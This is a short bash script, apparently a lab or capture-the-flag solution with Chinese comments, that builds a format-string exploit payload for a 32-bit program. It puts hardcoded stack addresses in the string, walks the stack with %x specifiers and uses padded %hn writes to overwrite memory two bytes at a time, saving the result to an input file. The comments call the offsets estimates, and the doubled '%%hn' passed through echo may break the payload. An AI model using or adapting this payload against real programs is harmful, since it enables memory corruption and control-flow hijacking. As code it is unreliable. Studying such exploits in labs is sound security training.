#!/bin/bash

# 目标地址
ADDR="\x64\xe9\xff\xbf"
ADDR_PLUS_2="\x66\xe9\xff\xbf"

# 低2字节和高2字节
LOW_BYTES=4351  # 0x10ff
HIGH_BYTES=8709 # 0x2205

# 计算已经输出的字节数（估算，需要根据实际情况调整）
# 3个地址（12字节）+ 偏移格式符产生的输出
BASE_OUTPUT=12

# 为低2字节计算需要的宽度
LOW_PADDING=$((LOW_BYTES - BASE_OUTPUT))

# 计算高2字节与低2字节的增量
INCREMENT=$((HIGH_BYTES - LOW_BYTES))

# 构造格式化字符串
# 1. 放入3个地址
# 2. 使用%x偏移到第11个单元
# 3. 写入低2字节
# 4. 写入高2字节
echo $(printf "${ADDR}${ADDR}${ADDR_PLUS_2}").%x.%x.%x.%x.%x.%x.%x.%x.%.${LOW_PADDING}u%%hn%.${INCREMENT}u%%hn > input